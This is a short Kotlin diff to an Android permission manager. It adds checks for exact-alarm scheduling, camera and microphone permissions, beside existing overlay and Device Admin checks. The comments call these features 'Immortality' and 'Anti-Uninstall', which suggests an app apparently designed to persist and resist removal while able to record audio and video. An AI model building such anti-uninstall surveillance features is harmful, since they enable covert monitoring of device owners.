@@ -99,6 +99,17 @@ object PermissionManager {
         return Settings.canDrawOverlays(ctx)
     }
 
+    // 5.8 Exact Alarm Access (Android 13+ Immortality)
+    fun hasExactAlarm(ctx: Context): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            val am = ctx.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+            am.canScheduleExactAlarms()
+        } else true
+    }
+
+    fun hasCamera(ctx: Context): Boolean = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+    fun hasMic(ctx: Context): Boolean = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+
     // 6. Device Admin (Anti-Uninstall)
     fun isAdmin(ctx: Context): Boolean {
         val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
